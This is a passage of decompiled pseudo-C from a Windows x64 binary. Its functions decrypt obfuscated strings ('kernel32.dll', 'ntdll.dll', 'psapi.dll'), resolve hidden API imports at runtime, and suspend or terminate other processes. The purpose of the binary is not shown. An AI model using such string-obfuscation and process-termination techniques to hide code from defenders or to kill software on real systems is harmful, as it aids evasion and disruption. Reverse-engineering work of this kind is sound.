    v5 = (((unsigned int)dword_1400DBF50 >> 13) ^ 32 * dword_1400DBF50 ^ dword_1400DBF50) + v4;
    dword_1400DBF50 ^= ((unsigned int)dword_1400DBF50 >> 13) ^ 32 * (dword_1400DBF50 ^ (dword_1400DBF50 << 12));
    byte_1400DBF98 = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400DBF9C = v1 | 2;
    byte_1400DBFA0[0] = v5 ^ 0x6B;
    byte_1400DBFA1 = (v5 - 1) ^ 0x65;
    byte_1400DBFA2 = (v5 - 2) ^ 0x72;
    byte_1400DBFA3 = (v5 - 3) ^ 0x6E;
    byte_1400DBFA4 = (v5 - 4) ^ 0x65;
    byte_1400DBFA5 = (v5 - 5) ^ 0x6C;
    byte_1400DBFA6 = (v5 - 6) ^ 0x33;
    byte_1400DBFA7 = (v5 - 7) ^ 0x32;
    byte_1400DBFA8 = (v5 - 8) ^ 0x2E;
    byte_1400DBFA9 = (v5 - 9) ^ 0x64;
    byte_1400DBFAA = (v5 - 10) ^ 0x6C;
    byte_1400DBFAB = (v5 - 11) ^ 0x6C;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 0xCui64 )
  {
    sub_140004790(Src, 0xCui64, 0i64);
    v5 = byte_1400DBF98;
  }
  if ( v3[3] < 0x10ui64 )
    v6 = v3;
  else
    v6 = (_QWORD *)*v3;
  *v6 = 0i64;
  *((_DWORD *)v6 + 2) = 0;
  v7 = v3[3] < 0x10ui64;
  v3[2] = 12i64;
  if ( v7 )
    v8 = v3;
  else
    v8 = (_QWORD *)*v3;
  *((_BYTE *)v8 + 12) = 0;
  v9 = 0i64;
  do
  {
    if ( v3[3] < 0x10ui64 )
      v10 = v3;
    else
      v10 = (_QWORD *)*v3;
    v11 = byte_1400DBFA0[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 0xC );
  return v3;
}
// 1400DBF4C: using guessed type int dword_1400DBF4C;
// 1400DBF50: using guessed type int dword_1400DBF50;
// 1400DBF54: using guessed type int dword_1400DBF54;
// 1400DBF58: using guessed type int dword_1400DBF58;
// 1400DBF98: using guessed type char byte_1400DBF98;
// 1400DBF9C: using guessed type int dword_1400DBF9C;
// 1400DBFA1: using guessed type char byte_1400DBFA1;
// 1400DBFA2: using guessed type char byte_1400DBFA2;
// 1400DBFA3: using guessed type char byte_1400DBFA3;
// 1400DBFA4: using guessed type char byte_1400DBFA4;
// 1400DBFA5: using guessed type char byte_1400DBFA5;
// 1400DBFA6: using guessed type char byte_1400DBFA6;
// 1400DBFA7: using guessed type char byte_1400DBFA7;
// 1400DBFA8: using guessed type char byte_1400DBFA8;
// 1400DBFA9: using guessed type char byte_1400DBFA9;
// 1400DBFAA: using guessed type char byte_1400DBFAA;
// 1400DBFAB: using guessed type char byte_1400DBFAB;

//----- (000000014007D150) ----------------------------------------------------
char *sub_14007D150()
{
  int v0; // er9
  int v1; // er10
  char v2; // r10
  char *result; // rax
  unsigned int v4; // ecx
  __int64 v5; // r9
  char v6; // r8
  char v7; // dl

  v0 = dword_1400DBF60;
  if ( dword_1400DBF60 & 1 )
  {
    v2 = byte_1400DBF5C;
  }
  else
  {
    v1 = 69069 * dword_1400DBF54 + 1234567;
    v0 = dword_1400DBF60 | 1;
    dword_1400DBF54 = v1;
    dword_1400DBF60 |= 1u;
    dword_1400DBF4C = HIWORD(dword_1400DBF4C) + 36969 * (unsigned __int16)dword_1400DBF4C;
    LOBYTE(v1) = (BYTE2(dword_1400DBF58) + 80 * dword_1400DBF58) ^ v1;
    dword_1400DBF58 = HIWORD(dword_1400DBF58) + 18000 * (unsigned __int16)dword_1400DBF58;
    v2 = (((unsigned int)dword_1400DBF50 >> 13) ^ 32 * dword_1400DBF50 ^ dword_1400DBF50) + v1;
    dword_1400DBF50 ^= ((unsigned int)dword_1400DBF50 >> 13) ^ 32 * (dword_1400DBF50 ^ (dword_1400DBF50 << 12));
    byte_1400DBF5C = v2;
  }
  if ( !(v0 & 2) )
  {
    dword_1400DBF60 = v0 | 2;
    byte_1400DBF64[0] = v2 ^ 0x6E;
    byte_1400DBF65 = (v2 - 1) ^ 0x74;
    byte_1400DBF66 = (v2 - 2) ^ 0x64;
    byte_1400DBF67 = (v2 - 3) ^ 0x6C;
    byte_1400DBF68 = (v2 - 4) ^ 0x6C;
  }
  result = byte_1400DBF6C;
  if ( !byte_1400DBF6C[0] )
  {
    v4 = 0;
    v5 = 0i64;
    do
    {
      v6 = byte_1400DBF64[v5++];
      v7 = v2 - v4++;
      byte_1400DBF6C[v5 - 1] = v7 ^ v6;
    }
    while ( v4 < 5 );
  }
  return result;
}
// 1400DBF4C: using guessed type int dword_1400DBF4C;
// 1400DBF50: using guessed type int dword_1400DBF50;
// 1400DBF54: using guessed type int dword_1400DBF54;
// 1400DBF58: using guessed type int dword_1400DBF58;
// 1400DBF5C: using guessed type char byte_1400DBF5C;
// 1400DBF60: using guessed type int dword_1400DBF60;
// 1400DBF65: using guessed type char byte_1400DBF65;
// 1400DBF66: using guessed type char byte_1400DBF66;
// 1400DBF67: using guessed type char byte_1400DBF67;
// 1400DBF68: using guessed type char byte_1400DBF68;

//----- (000000014007D280) ----------------------------------------------------
_QWORD *__fastcall sub_14007D280(void *Src)
{
  int v1; // er10
  unsigned int v2; // edi
  _QWORD *v3; // rbx
  int v4; // er9
  char v5; // r9
  _QWORD *v6; // rax
  bool v7; // cf
  _QWORD *v8; // rax
  __int64 v9; // rdx
  _QWORD *v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400DBFDC;
  v2 = 0;
  v3 = Src;
  if ( dword_1400DBFDC & 1 )
  {
    v5 = byte_1400DBFD9;
  }
  else
  {
    v4 = 69069 * dword_1400DBF54 + 1234567;
    v1 = dword_1400DBFDC | 1;
    dword_1400DBF54 = v4;
    dword_1400DBFDC |= 1u;
    dword_1400DBF4C = HIWORD(dword_1400DBF4C) + 36969 * (unsigned __int16)dword_1400DBF4C;
    LOBYTE(v4) = (BYTE2(dword_1400DBF58) + 80 * dword_1400DBF58) ^ v4;
    dword_1400DBF58 = HIWORD(dword_1400DBF58) + 18000 * (unsigned __int16)dword_1400DBF58;
    v5 = (((unsigned int)dword_1400DBF50 >> 13) ^ 32 * dword_1400DBF50 ^ dword_1400DBF50) + v4;
    dword_1400DBF50 ^= ((unsigned int)dword_1400DBF50 >> 13) ^ 32 * (dword_1400DBF50 ^ (dword_1400DBF50 << 12));
    byte_1400DBFD9 = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400DBFDC = v1 | 2;
    byte_1400DBFE0[0] = v5 ^ 0x6E;
    byte_1400DBFE1 = (v5 - 1) ^ 0x74;
    byte_1400DBFE2 = (v5 - 2) ^ 0x64;
    byte_1400DBFE3 = (v5 - 3) ^ 0x6C;
    byte_1400DBFE4 = (v5 - 4) ^ 0x6C;
    byte_1400DBFE5 = (v5 - 5) ^ 0x2E;
    byte_1400DBFE6 = (v5 - 6) ^ 0x64;
    byte_1400DBFE7 = (v5 - 7) ^ 0x6C;
    byte_1400DBFE8 = (v5 - 8) ^ 0x6C;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 9ui64 )
  {
    sub_140004790(Src, 9ui64, 0i64);
    v5 = byte_1400DBFD9;
  }
  if ( v3[3] < 0x10ui64 )
    v6 = v3;
  else
    v6 = (_QWORD *)*v3;
  *v6 = 0i64;
  *((_BYTE *)v6 + 8) = 0;
  v7 = v3[3] < 0x10ui64;
  v3[2] = 9i64;
  if ( v7 )
    v8 = v3;
  else
    v8 = (_QWORD *)*v3;
  *((_BYTE *)v8 + 9) = 0;
  v9 = 0i64;
  do
  {
    if ( v3[3] < 0x10ui64 )
      v10 = v3;
    else
      v10 = (_QWORD *)*v3;
    v11 = byte_1400DBFE0[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 9 );
  return v3;
}
// 1400DBF4C: using guessed type int dword_1400DBF4C;
// 1400DBF50: using guessed type int dword_1400DBF50;
// 1400DBF54: using guessed type int dword_1400DBF54;
// 1400DBF58: using guessed type int dword_1400DBF58;
// 1400DBFD9: using guessed type char byte_1400DBFD9;
// 1400DBFDC: using guessed type int dword_1400DBFDC;
// 1400DBFE1: using guessed type char byte_1400DBFE1;
// 1400DBFE2: using guessed type char byte_1400DBFE2;
// 1400DBFE3: using guessed type char byte_1400DBFE3;
// 1400DBFE4: using guessed type char byte_1400DBFE4;
// 1400DBFE5: using guessed type char byte_1400DBFE5;
// 1400DBFE6: using guessed type char byte_1400DBFE6;
// 1400DBFE7: using guessed type char byte_1400DBFE7;
// 1400DBFE8: using guessed type char byte_1400DBFE8;

//----- (000000014007D460) ----------------------------------------------------
_QWORD *__fastcall sub_14007D460(void *Src)
{
  int v1; // er10
  unsigned int v2; // edi
  _QWORD *v3; // rbx
  int v4; // er9
  char v5; // r9
  _QWORD *v6; // rax
  bool v7; // cf
  _QWORD *v8; // rax
  __int64 v9; // rdx
  _QWORD *v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400DBFEC;
  v2 = 0;
  v3 = Src;
  if ( dword_1400DBFEC & 1 )
  {
    v5 = byte_1400DBFE9;
  }
  else
  {
    v4 = 69069 * dword_1400DBF54 + 1234567;
    v1 = dword_1400DBFEC | 1;
    dword_1400DBF54 = v4;
    dword_1400DBFEC |= 1u;
    dword_1400DBF4C = HIWORD(dword_1400DBF4C) + 36969 * (unsigned __int16)dword_1400DBF4C;
    LOBYTE(v4) = (BYTE2(dword_1400DBF58) + 80 * dword_1400DBF58) ^ v4;
    dword_1400DBF58 = HIWORD(dword_1400DBF58) + 18000 * (unsigned __int16)dword_1400DBF58;
    v5 = (((unsigned int)dword_1400DBF50 >> 13) ^ 32 * dword_1400DBF50 ^ dword_1400DBF50) + v4;
    dword_1400DBF50 ^= ((unsigned int)dword_1400DBF50 >> 13) ^ 32 * (dword_1400DBF50 ^ (dword_1400DBF50 << 12));
    byte_1400DBFE9 = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400DBFEC = v1 | 2;
    byte_1400DBFF0[0] = v5 ^ 0x70;
    byte_1400DBFF1 = (v5 - 1) ^ 0x73;
    byte_1400DBFF2 = (v5 - 2) ^ 0x61;
    byte_1400DBFF3 = (v5 - 3) ^ 0x70;
    byte_1400DBFF4 = (v5 - 4) ^ 0x69;
    byte_1400DBFF5 = (v5 - 5) ^ 0x2E;
    byte_1400DBFF6 = (v5 - 6) ^ 0x64;
    byte_1400DBFF7 = (v5 - 7) ^ 0x6C;
    byte_1400DBFF8 = (v5 - 8) ^ 0x6C;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 9ui64 )
  {
    sub_140004790(Src, 9ui64, 0i64);
    v5 = byte_1400DBFE9;
  }
  if ( v3[3] < 0x10ui64 )
    v6 = v3;
  else
    v6 = (_QWORD *)*v3;
  *v6 = 0i64;
  *((_BYTE *)v6 + 8) = 0;
  v7 = v3[3] < 0x10ui64;
  v3[2] = 9i64;
  if ( v7 )
    v8 = v3;
  else
    v8 = (_QWORD *)*v3;
  *((_BYTE *)v8 + 9) = 0;
  v9 = 0i64;
  do
  {
    if ( v3[3] < 0x10ui64 )
      v10 = v3;
    else
      v10 = (_QWORD *)*v3;
    v11 = byte_1400DBFF0[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 9 );
  return v3;
}
// 1400DBF4C: using guessed type int dword_1400DBF4C;
// 1400DBF50: using guessed type int dword_1400DBF50;
// 1400DBF54: using guessed type int dword_1400DBF54;
// 1400DBF58: using guessed type int dword_1400DBF58;
// 1400DBFE9: using guessed type char byte_1400DBFE9;
// 1400DBFEC: using guessed type int dword_1400DBFEC;
// 1400DBFF1: using guessed type char byte_1400DBFF1;
// 1400DBFF2: using guessed type char byte_1400DBFF2;
// 1400DBFF3: using guessed type char byte_1400DBFF3;
// 1400DBFF4: using guessed type char byte_1400DBFF4;
// 1400DBFF5: using guessed type char byte_1400DBFF5;
// 1400DBFF6: using guessed type char byte_1400DBFF6;
// 1400DBFF7: using guessed type char byte_1400DBFF7;
// 1400DBFF8: using guessed type char byte_1400DBFF8;

//----- (000000014007D640) ----------------------------------------------------
__int64 __fastcall sub_14007D640(__int64 a1)
{
  __int64 v1; // rdi
  char *v2; // rbx
  char *v3; // rax
  HMODULE v4; // rax
  FARPROC v5; // rax
  __int64 result; // rax

  v1 = a1;
  v2 = sub_14007CA80();
  v3 = sub_14007D150();
  v4 = GetModuleHandleA(v3);
  v5 = GetProcAddress(v4, v2);
  if ( v5 )
    result = ((__int64 (__fastcall *)(__int64))v5)(v1);
  else
    result = 1i64;
  return result;
}

//----- (000000014007D6A0) ----------------------------------------------------
__int64 __fastcall sub_14007D6A0(__int64 a1)
{
  __int64 v1; // rdi
  char *v2; // rbx
  char *v3; // rax
  HMODULE v4; // rax
  FARPROC v5; // rax
  __int64 result; // rax

  v1 = a1;
  v2 = sub_14007CC30();
  v3 = sub_14007D150();
  v4 = GetModuleHandleA(v3);
  v5 = GetProcAddress(v4, v2);
  if ( v5 )
    result = ((__int64 (__fastcall *)(__int64))v5)(v1);
  else
    result = 1i64;
  return result;
}

//----- (000000014007D700) ----------------------------------------------------
char __fastcall sub_14007D700(__int64 a1, DWORD a2)
{
  HANDLE v2; // rax
  void *v3; // rdi
  int v4; // ebx

  if ( a2 )
  {
    v2 = OpenProcess(0x800u, 0, a2);
    v3 = v2;
    if ( v2 )
    {
      v4 = sub_14007D6A0((__int64)v2);
      CloseHandle(v3);
      LOBYTE(v2) = v4 >= 0;
    }
  }
  else
  {
    LOBYTE(v2) = 0;
  }
  return (char)v2;
}

//----- (000000014007D770) ----------------------------------------------------
void __fastcall sub_14007D770(__int64 a1)
{
  __int64 v1; // rbx
  void **v2; // rdi
  __int64 *v3; // rax
  __int64 v4; // rdx
  void (__fastcall ***v5)(_QWORD, signed __int64); // rcx
  void (__fastcall ***v6)(_QWORD, signed __int64); // [rsp+20h] [rbp-68h]
  __int64 v7; // [rsp+28h] [rbp-60h]
  void *v8; // [rsp+30h] [rbp-58h]
  __int64 v9; // [rsp+40h] [rbp-48h]
  unsigned __int64 v10; // [rsp+48h] [rbp-40h]
  void *Src; // [rsp+50h] [rbp-38h]
  unsigned __int64 v12; // [rsp+68h] [rbp-20h]

  v7 = -2i64;
  v1 = a1;
  if ( !*(_QWORD *)(a1 + 80) )
  {
    v10 = 15i64;
    v9 = 0i64;
    LOBYTE(v8) = 0;
    if ( !(unsigned __int8)sub_14007C440(a1 + 24, 3i64, &v8) )
    {
      v2 = (void **)sub_14007D280(&Src);
      if ( &v8 != v2 )
      {
        if ( v10 >= 0x10 )
          operator delete(v8);
        v10 = 15i64;
        v9 = 0i64;
        LOBYTE(v8) = 0;
        sub_140004720(&v8, v2);
      }
      if ( v12 >= 0x10 )
        operator delete(Src);
    }
    v3 = sub_14007C530(&v6, (const CHAR *)&v8);
    v4 = *v3;
    *v3 = 0i64;
    v5 = *(void (__fastcall ****)(_QWORD, signed __int64))(v1 + 80);
    *(_QWORD *)(v1 + 80) = v4;
    if ( v5 )
      (**v5)(v5, 1i64);
    if ( v6 )
      (**v6)(v6, 1i64);
    if ( v10 >= 0x10 )
      operator delete(v8);
  }
}
// 14007C440: using guessed type __int64 __fastcall sub_14007C440(_QWORD, _QWORD, _QWORD);

//----- (000000014007D8B0) ----------------------------------------------------
void __fastcall sub_14007D8B0(__int64 a1)
{
  __int64 v1; // rbx
  void **v2; // rdi
  __int64 *v3; // rax
  __int64 v4; // rdx
  void (__fastcall ***v5)(_QWORD, signed __int64); // rcx
  void (__fastcall ***v6)(_QWORD, signed __int64); // [rsp+20h] [rbp-68h]
  __int64 v7; // [rsp+28h] [rbp-60h]
  void *v8; // [rsp+30h] [rbp-58h]
  __int64 v9; // [rsp+40h] [rbp-48h]
  unsigned __int64 v10; // [rsp+48h] [rbp-40h]
  void *Src; // [rsp+50h] [rbp-38h]
  unsigned __int64 v12; // [rsp+68h] [rbp-20h]

  v7 = -2i64;
  v1 = a1;
  if ( !*(_QWORD *)(a1 + 88) )
  {
    v10 = 15i64;
    v9 = 0i64;
    LOBYTE(v8) = 0;
    if ( !(unsigned __int8)sub_14007C440(a1 + 24, 3i64, &v8) )
    {
      v2 = (void **)sub_14007D280(&Src);
      if ( &v8 != v2 )
      {
        if ( v10 >= 0x10 )
          operator delete(v8);
        v10 = 15i64;
        v9 = 0i64;
        LOBYTE(v8) = 0;
        sub_140004720(&v8, v2);
      }
      if ( v12 >= 0x10 )
        operator delete(Src);
    }
    v3 = sub_14007C590(&v6, (const CHAR *)&v8);
    v4 = *v3;
    *v3 = 0i64;
    v5 = *(void (__fastcall ****)(_QWORD, signed __int64))(v1 + 88);
    *(_QWORD *)(v1 + 88) = v4;
    if ( v5 )
      (**v5)(v5, 1i64);
    if ( v6 )
      (**v6)(v6, 1i64);
    if ( v10 >= 0x10 )
      operator delete(v8);
  }
}
// 14007C440: using guessed type __int64 __fastcall sub_14007C440(_QWORD, _QWORD, _QWORD);

//----- (000000014007D9F0) ----------------------------------------------------
void __fastcall sub_14007D9F0(__int64 a1)
{
  __int64 v1; // rbx
  void **v2; // rdi
  void **v3; // rdi
  __int64 *v4; // rax
  __int64 v5; // rdx
  void (__fastcall ***v6)(_QWORD, signed __int64); // rcx
  void (__fastcall ***v7)(_QWORD, signed __int64); // [rsp+8h] [rbp-39h]
  __int64 v8; // [rsp+10h] [rbp-31h]
  void *v9; // [rsp+18h] [rbp-29h]
  __int64 v10; // [rsp+28h] [rbp-19h]
  unsigned __int64 v11; // [rsp+30h] [rbp-11h]
  void *v12; // [rsp+38h] [rbp-9h]
  __int64 v13; // [rsp+48h] [rbp+7h]
  unsigned __int64 v14; // [rsp+50h] [rbp+Fh]
  void *Src; // [rsp+58h] [rbp+17h]
  unsigned __int64 v16; // [rsp+70h] [rbp+2Fh]

  v8 = -2i64;
  v1 = a1;
  if ( !*(_QWORD *)(a1 + 64) )
  {
    v14 = 15i64;
    v13 = 0i64;
    LOBYTE(v12) = 0;
    if ( !(unsigned __int8)sub_14007C440(a1 + 24, 2i64, &v12) )
    {
      v2 = (void **)sub_14007CF40(&Src);
      if ( &v12 != v2 )
      {
        if ( v14 >= 0x10 )
          operator delete(v12);
        v14 = 15i64;
        v13 = 0i64;
        LOBYTE(v12) = 0;
        sub_140004720(&v12, v2);
      }
      if ( v16 >= 0x10 )
        operator delete(Src);
    }
    v11 = 15i64;
    v10 = 0i64;
    if ( !(unsigned __int8)sub_14007C440(v1 + 24, 1i64, &v9) )
    {
      v3 = (void **)sub_14007D460(&Src);
      if ( &v9 != v3 )
      {
        if ( v11 >= 0x10 )
          operator delete(v9);
        v11 = 15i64;
        v10 = 0i64;
        sub_140004720(&v9, v3);
      }
      if ( v16 >= 0x10 )
        operator delete(Src);
    }
    v4 = sub_14007C640(&v7, (const CHAR *)&v12, (const CHAR *)&v9);
    v5 = *v4;
    *v4 = 0i64;
    v6 = *(void (__fastcall ****)(_QWORD, signed __int64))(v1 + 64);
    *(_QWORD *)(v1 + 64) = v5;
    if ( v6 )
      (**v6)(v6, 1i64);
    if ( v7 )
      (**v7)(v7, 1i64);
    if ( v11 >= 0x10 )
      operator delete(v9);
    v11 = 15i64;
    v10 = 0i64;
    LOBYTE(v9) = 0;
    if ( v14 >= 0x10 )
      operator delete(v12);
  }
}
// 14007C440: using guessed type __int64 __fastcall sub_14007C440(_QWORD, _QWORD, _QWORD);

//----- (000000014007DBC0) ----------------------------------------------------
void __fastcall sub_14007DBC0(__int64 a1)
{
  __int64 v1; // rbx
  void **v2; // rdi
  __int64 *v3; // rax
  __int64 v4; // rdx
  void (__fastcall ***v5)(_QWORD, signed __int64); // rcx
  void (__fastcall ***v6)(_QWORD, signed __int64); // [rsp+20h] [rbp-68h]
  __int64 v7; // [rsp+28h] [rbp-60h]
  void *v8; // [rsp+30h] [rbp-58h]
  __int64 v9; // [rsp+40h] [rbp-48h]
  unsigned __int64 v10; // [rsp+48h] [rbp-40h]
  void *Src; // [rsp+50h] [rbp-38h]
  unsigned __int64 v12; // [rsp+68h] [rbp-20h]

  v7 = -2i64;
  v1 = a1;
  if ( !*(_QWORD *)(a1 + 72) )
  {
    v10 = 15i64;
    v9 = 0i64;
    LOBYTE(v8) = 0;
    if ( !(unsigned __int8)sub_14007C440(a1 + 24, 1i64, &v8) )
    {
      v2 = (void **)sub_14007D460(&Src);
      if ( &v8 != v2 )
      {
        if ( v10 >= 0x10 )
          operator delete(v8);
        v10 = 15i64;
        v9 = 0i64;
        LOBYTE(v8) = 0;
        sub_140004720(&v8, v2);
      }
      if ( v12 >= 0x10 )
        operator delete(Src);
    }
    v3 = (__int64 *)sub_14007C6B0(&v6, &v8);
    v4 = *v3;
    *v3 = 0i64;
    v5 = *(void (__fastcall ****)(_QWORD, signed __int64))(v1 + 72);
    *(_QWORD *)(v1 + 72) = v4;
    if ( v5 )
      (**v5)(v5, 1i64);
    if ( v6 )
      (**v6)(v6, 1i64);
    if ( v10 >= 0x10 )
      operator delete(v8);
  }
}
// 14007C440: using guessed type __int64 __fastcall sub_14007C440(_QWORD, _QWORD, _QWORD);
// 14007C6B0: using guessed type __int64 __fastcall sub_14007C6B0(_QWORD, _QWORD);

//----- (000000014007DD00) ----------------------------------------------------
char __fastcall sub_14007DD00(__int64 a1, DWORD a2)
{
  HANDLE v2; // rax
  void *v3; // rdi
  int v4; // ebx

  if ( a2 )
  {
    v2 = OpenProcess(0x800u, 0, a2);
    v3 = v2;
    if ( v2 )
    {
      v4 = sub_14007D640((__int64)v2);
      CloseHandle(v3);
      LOBYTE(v2) = v4 >= 0;
    }
  }
  else
  {
    LOBYTE(v2) = 0;
  }
  return (char)v2;
}

//----- (000000014007DD70) ----------------------------------------------------
char __fastcall sub_14007DD70(__int64 a1, DWORD a2)
{
  HANDLE v2; // rax
  void *v3; // rdi
  BOOL v4; // ebx

  if ( a2 )
  {
    v2 = OpenProcess(1u, 0, a2);
    v3 = v2;
    if ( v2 )
    {
      v4 = TerminateProcess(v2, 1u);
      CloseHandle(v3);
      LOBYTE(v2) = v4 != 0;
    }
  }
  else
  {
    LOBYTE(v2) = 0;
  }
  return (char)v2;
}

//----- (000000014007DED0) ----------------------------------------------------
void __fastcall sub_14007DED0(__int64 a1, int *a2, const void *a3, __int64 a4)
{
  __int64 v4; // r14
  const void *v5; // r15
  int *v6; // r9
  __int64 v7; // rbx
  unsigned __int64 v8; // r14
  __int64 v9; // rdi
  void *v10; // rcx
  const void *v11; // rdx
  __int64 v12; // rcx
  unsigned __int64 v13; // r10
  unsigned __int64 v14; // rdi
  char *v15; // rsi
  unsigned __int64 v16; // rdi
  size_t v17; // r12
  char *v18; // rcx
  char *v19; // rax
  unsigned __int64 v20; // r14
  size_t v21; // r14
  __int64 v22; // rdx
  __int64 v23; // r8
  int *Src; // [rsp+78h] [rbp+10h]

  Src = a2;
  v4 = a4;
  v5 = a3;
  v6 = a2;
  v7 = a1;
  v8 = (v4 - (signed __int64)a3) >> 2;
  if ( v8 )
  {
    v9 = *(_QWORD *)(a1 + 16);
    v10 = *(void **)(a1 + 8);
    if ( (v9 - (signed __int64)v10) >> 2 >= v8 )
    {
      v21 = 4 * v8;
      memmove(v10, a3, v21);
      v22 = *(_QWORD *)(v7 + 8);
      v23 = v21 + v22;
      if ( Src != (int *)v22 && v22 != v23 )
        sub_14007E0A0(Src, v22, v23);
      *(_QWORD *)(v7 + 8) += v21;
    }
    else
    {
      v11 = *(const void **)v7;
      v12 = (_QWORD)((_QWORD)v10 - *(_QWORD *)v7) >> 2;
      v13 = 0x3FFFFFFFFFFFFFFFi64;
      if ( 0x3FFFFFFFFFFFFFFFi64 - v12 < v8 )
      {
        std::_Xlength_error("vector<T> too long");
        __debugbreak();
      }
      v14 = (v9 - (signed __int64)v11) >> 2;
      if ( v13 - (v14 >> 1) >= v14 )
      {
        v16 = (v14 >> 1) + v14;
        v15 = 0i64;
      }
      else
      {
        v15 = 0i64;
        v16 = 0i64;
      }
      if ( v16 < v12 + v8 )
        v16 = v12 + v8;
      if ( v16 )
      {
        if ( v16 <= v13 && (v15 = (char *)operator new(4 * v16)) != 0i64 )
          v6 = Src;
        else
          std::_Xbad_alloc();
      }
      v17 = 4 * (((signed __int64)v6 - *(_QWORD *)v7) >> 2);
      v18 = (char *)memmove(v15, *(const void **)v7, v17) + v17;
      v19 = (char *)memmove(v18, v5, 4 * v8);
      memmove(&v19[4 * v8], Src, 4i64 * ((*(_QWORD *)(v7 + 8) - (_QWORD)Src) >> 2));
      v20 = ((*(_QWORD *)(v7 + 8) - *(_QWORD *)v7) >> 2) + v8;
      if ( *(_QWORD *)v7 )
        operator delete(*(void **)v7);
      *(_QWORD *)(v7 + 16) = &v15[4 * v16];
      *(_QWORD *)(v7 + 8) = &v15[4 * v20];
      *(_QWORD *)v7 = v15;
    }
  }
}
// 1400A1770: using guessed type void __stdcall std::_Xlength_error(const char *);
// 1400A1778: using guessed type void std::_Xbad_alloc(void);

//----- (000000014007E0A0) ----------------------------------------------------
void __fastcall sub_14007E0A0(int *a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rsi
  __int64 v4; // r8
  int *v5; // rdi
  __int64 v6; // r9
  __int64 v7; // r11
  __int64 i; // rcx
  __int64 v9; // rax
  signed __int64 v10; // r8
  signed __int64 v11; // rbx
  int *v12; // rax
  int *v13; // r10
  int v14; // edx
  __int64 v15; // rcx

  v3 = a3;
  v4 = (a3 - (signed __int64)a1) >> 2;
  v5 = a1;
  v6 = (a2 - (signed __int64)a1) >> 2;
  v7 = v4;
  for ( i = v6; i; i = v9 % i )
  {
    v9 = v7;
    v7 = i;
  }
  if ( v7 < v4 && v7 > 0 )
  {
    v10 = (signed __int64)&v5[v7];
    v11 = 4 * v6;
    do
    {
      v12 = (int *)(v10 + v11);
      v13 = (int *)v10;
      if ( v10 + v11 == v3 )
        v12 = v5;
      do
      {
        v14 = *v13;
        *v13 = *v12;
        *v12 = v14;
        v13 = v12;
        v15 = (v3 - (signed __int64)v12) >> 2;
        if ( v6 >= v15 )
          v12 = &v5[v6 - v15];
        else
          v12 = (int *)((char *)v12 + v11);
      }
      while ( v12 != (int *)v10 );
      --v7;
      v10 -= 4i64;
    }
    while ( v7 > 0 );
  }
}

//----- (000000014007E160) ----------------------------------------------------
_QWORD *__fastcall sub_14007E160(_QWORD *a1, const CHAR *a2, const CHAR *a3)
{
  const CHAR *v3; // rdi
  _QWORD *v4; // rbx
  HMODULE v5; // rax
  char *v6; // rax
  HMODULE v7; // rax
  char *v8; // rax

  v3 = a3;
  v4 = a1;
  *a1 = &off_1400B0E60;
  a1[1] = 0i64;
  a1[2] = 0i64;
  a1[3] = 0i64;
  a1[4] = 0i64;
  if ( *((_QWORD *)a2 + 3) >= 0x10ui64 )
    a2 = *(const CHAR **)a2;
  v5 = LoadLibraryA(a2);
  v4[1] = v5;
  if ( v5 )
  {
    v6 = sub_14007E730();
    v4[3] = GetProcAddress((HMODULE)v4[1], v6);
  }
  if ( *((_QWORD *)v3 + 3) >= 0x10ui64 )
    v3 = *(const CHAR **)v3;
  v7 = LoadLibraryA(v3);
  v4[2] = v7;
  if ( v7 )
  {
    v8 = sub_14007E2F0();
    v4[4] = GetProcAddress((HMODULE)v4[2], v8);
  }
  return v4;
}
// 1400B0E60: using guessed type __int64 (__fastcall *off_1400B0E60)(void *);

//----- (000000014007E210) ----------------------------------------------------
__int64 __fastcall sub_14007E210(void **a1)
{
  void **v1; // rbx
  void *v2; // rcx
  __int64 result; // rax

  v1 = a1;
  v2 = *a1;
  if ( v2 )
  {
    operator delete(v2);
    result = 0i64;
    *v1 = 0i64;
    v1[1] = 0i64;
    v1[2] = 0i64;
  }
  return result;
}

//----- (000000014007E240) ----------------------------------------------------
__int64 (__fastcall **__fastcall sub_14007E240(_QWORD *a1))()
{
  __int64 (__fastcall **result)(); // rax

  result = &off_1400B0E50;
  *a1 = &off_1400B0E50;
  return result;
}
// 1400B0E50: using guessed type __int64 (__fastcall *off_1400B0E50)();

//----- (000000014007E250) ----------------------------------------------------
_QWORD *__fastcall sub_14007E250(void *a1, char a2)
{
  char v2; // di
  _QWORD *v3; // rbx
  HMODULE v4; // rcx
  HMODULE v5; // rcx

  v2 = a2;
  v3 = a1;
  *(_QWORD *)a1 = &off_1400B0E60;
  v4 = (HMODULE)*((_QWORD *)a1 + 1);
  if ( v4 )
    FreeLibrary(v4);
  v5 = (HMODULE)v3[2];
  if ( v5 )
    FreeLibrary(v5);
  *v3 = &off_1400B0E50;
  if ( v2 & 1 )
    operator delete(v3);
  return v3;
}
// 1400B0E50: using guessed type __int64 (__fastcall *off_1400B0E50)();
// 1400B0E60: using guessed type __int64 (__fastcall *off_1400B0E60)(void *);

//----- (000000014007E2C0) ----------------------------------------------------
_QWORD *__fastcall sub_14007E2C0(_QWORD *a1, char a2)
{
  _QWORD *v2; // rbx

  v2 = a1;
  *a1 = &off_1400B0E50;
  if ( a2 & 1 )
    operator delete(a1);
  return v2;
}
// 1400B0E50: using guessed type __int64 (__fastcall *off_1400B0E50)();

//----- (000000014007E2F0) ----------------------------------------------------
char *sub_14007E2F0()
{
  int v0; // er9
  int v1; // er10
  char v2; // r10
